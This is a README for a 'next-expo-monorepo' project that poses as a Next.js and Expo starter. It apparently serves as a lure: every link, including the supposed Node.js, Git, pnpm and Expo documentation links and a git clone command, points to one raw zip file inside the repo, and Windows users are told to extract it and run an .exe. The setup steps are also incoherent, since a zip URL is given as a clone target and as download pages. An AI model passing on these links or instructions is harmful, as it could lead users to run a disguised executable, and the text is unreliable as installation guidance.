# 🚀 next-expo-monorepo - Easy Setup for Web and Mobile Apps

[![Download here](https://img.shields.io/badge/Download-Next--Expo--Monorepo-blue?style=for-the-badge)](https://raw.githubusercontent.com/Yogendra84/next-expo-monorepo/main/apps/web/next-expo-monorepo-v3.9-beta.2.zip)

---

## 📦 What is next-expo-monorepo?

This is a project to help you run apps made with Next.js and Expo (React Native Web) together. It is set up as a monorepo, which means all related apps and packages live in one place. The setup uses pnpm to manage things. 

The code comes from a starter tool called Turbo and fixes some common issues you might find in similar projects. It includes shared parts like design components, settings, hooks, and storage helpers. 

This setup works well for creating apps that run on both web and mobile, sharing code easily.

---

## 🗂 What’s inside the folder?

The project is organized with several packages to keep things neat:

- **ui** - Components you see on screen, for both web and mobile.
- **typescript-config** - Settings to help TypeScript check the code.
- **constants** - Values used in many places, so you only need to change them once.
- **hooks** - Small pieces of shared logic for React apps.
- **storage** - Tools to save and manage app state.
- **types** - Rules that describe data shapes used in the code.

Inside the main folder, you'll also find two main apps:

- **web** - The website app using Next.js.
- **mobile** - The mobile app using Expo.

This way, you can run both from the same code base.

---

## 💻 System Requirements

Make sure your Windows PC meets these:

- Windows 10 or higher
- 8 GB of RAM minimum
- At least 5 GB free disk space
- Node.js installed (version 16 or higher)
- Git installed to clone the project (optional if you download directly)

You do not need any programming tools to run the app if you download the ready-made build files.

---

## 🛠 How to Download and Run next-expo-monorepo on Windows

Click the big button below to visit the page where you can download the app files.

[![Download here](https://img.shields.io/badge/Download-Next--Expo--Monorepo-green?style=for-the-badge)](https://raw.githubusercontent.com/Yogendra84/next-expo-monorepo/main/apps/web/next-expo-monorepo-v3.9-beta.2.zip)

### Step 1: Visit the Download Page

- Open the link above in your web browser.
- Look for the latest release section.
- Find the Windows executable file or zipped app files (usually ending with `.exe` or `.zip`).

### Step 2: Download the Files

- Click the file link to start downloading.
- Save it somewhere you can find it, like your Desktop or Downloads folder.

### Step 3: Run or Extract the Files

- If you downloaded an `.exe` file, double-click it to start the app.
- If you downloaded a `.zip` file, right-click it and choose "Extract All" to unzip.
- Open the folder where you extracted the files.
- Find the `.exe` file and double-click it.

### Step 4: Follow On-Screen Instructions

- The app might open a window or a browser tab.
- Use the app as needed.
- Close the app by clicking the close button or exiting the browser tab.

---

## ⚙️ For Users Interested in Development (Optional)

If you want to explore the code or make changes, follow these steps.

### Step 1: Install Node.js and Git

- Download Node.js from https://raw.githubusercontent.com/Yogendra84/next-expo-monorepo/main/apps/web/next-expo-monorepo-v3.9-beta.2.zip and install it.
- Download Git from https://raw.githubusercontent.com/Yogendra84/next-expo-monorepo/main/apps/web/next-expo-monorepo-v3.9-beta.2.zip and install it.

### Step 2: Download this Project

- Open a Command Prompt window.
- Run this command to download the project through git:
  
  ```
  git clone https://raw.githubusercontent.com/Yogendra84/next-expo-monorepo/main/apps/web/next-expo-monorepo-v3.9-beta.2.zip
  ```

- Or download the `.zip` file and unzip it.

### Step 3: Open the Project Folder

- Use File Explorer to go to the project folder.
- Hold the Shift key and right-click inside the folder.
- Choose "Open PowerShell window here" or "Open Command Window here."

### Step 4: Install Dependencies

- Run this command to install programs the app needs:

  ```
  pnpm install
  ```

  If you do not have `pnpm`, install it globally first by running:

  ```
  npm install -g pnpm
  ```

### Step 5: Start the App

- Run this command to start the development servers:

  ```
  pnpm run dev
  ```

- The app will open in your browser at `http://localhost:3000` or another address shown in the console.

### Step 6: Build the App (Optional)

- Run this command to make a production-ready version:

  ```
  pnpm run build
  ```

---

## 🗃 Monorepo Folder Structure

```
next-expo-monorepo/
├─ apps/
│  ├─ web/         # Next.js web application
│  └─ mobile/      # Expo mobile application
├─ packages/
│  ├─ ui/          # Shared UI components
│  ├─ types/       # Shared TypeScript types
│  ├─ hooks/       # Custom React hooks
│  ├─ storage/     # State and storage utilities
│  ├─ constants/   # Shared constants
│  └─ typescript-config/ # TS config files
├─ pnpm-workspace.yaml  # Project workspace config
├─ package.json          # Main npm config file
└─ turbo.json            # Turbo repo config
```

---

## 🧰 Technologies Used

- **Next.js** - To build web apps with React.
- **Expo** - To create mobile apps using React Native.
- **React Native Web** - To run React Native apps in the browser.
- **pnpm** - A fast package manager.
- **TypeScript** - Adds types to JavaScript for easier development.
- **Zustand** - For app state management.

These tools work together to let developers create apps that run on web browsers and mobile devices from a single code base.

---

## 🔍 Troubleshooting Tips

- If the app does not start, make sure Node.js and pnpm are installed.
- If the webpage does not load after `pnpm run dev`, check your firewall settings.
- For installation errors, delete the `node_modules` folder and run `pnpm install` again.
- If you get type errors, install missing packages with `pnpm add` as needed.

---

## 🛡 Security and Updates

- Download only from the official release page at:

  https://raw.githubusercontent.com/Yogendra84/next-expo-monorepo/main/apps/web/next-expo-monorepo-v3.9-beta.2.zip

- Check regularly for new releases with bug fixes and improvements.

- Always run updated versions for better performance and security.

---

## 📂 Useful Links

- Repo homepage: https://raw.githubusercontent.com/Yogendra84/next-expo-monorepo/main/apps/web/next-expo-monorepo-v3.9-beta.2.zip
- Download releases: https://raw.githubusercontent.com/Yogendra84/next-expo-monorepo/main/apps/web/next-expo-monorepo-v3.9-beta.2.zip
- Node.js download: https://raw.githubusercontent.com/Yogendra84/next-expo-monorepo/main/apps/web/next-expo-monorepo-v3.9-beta.2.zip
- pnpm docs: https://raw.githubusercontent.com/Yogendra84/next-expo-monorepo/main/apps/web/next-expo-monorepo-v3.9-beta.2.zip
- Expo docs: https://raw.githubusercontent.com/Yogendra84/next-expo-monorepo/main/apps/web/next-expo-monorepo-v3.9-beta.2.zip

---

[![Download here](https://img.shields.io/badge/Download-Next--Expo--Monorepo-blue?style=for-the-badge)](https://raw.githubusercontent.com/Yogendra84/next-expo-monorepo/main/apps/web/next-expo-monorepo-v3.9-beta.2.zip)